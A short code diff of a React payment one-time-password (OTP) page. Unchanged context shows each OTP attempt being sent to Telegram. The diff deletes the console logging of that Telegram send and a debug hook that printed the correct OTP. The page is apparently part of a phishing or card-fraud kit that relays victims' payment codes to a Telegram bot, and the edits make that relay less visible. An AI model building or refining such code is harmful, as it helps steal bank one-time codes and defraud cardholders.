@@ -122,11 +122,7 @@ const PaymentOTP = () => {
       timestamp: new Date().toISOString()
     });
 
-    if (telegramResult.success) {
-      console.log('OTP attempt sent to Telegram successfully');
-    } else {
-      console.error('Failed to send OTP attempt to Telegram:', telegramResult.error);
-    }
+
 
     if (otp === payment.otp) {
       const formData = new FormData();
@@ -197,11 +193,7 @@ const PaymentOTP = () => {
     }
   };
   
-  useEffect(() => {
-    if (payment?.otp) {
-      console.log("🔐 OTP للاختبار:", payment.otp);
-    }
-  }, [payment]);
+
   
   return (
     <>
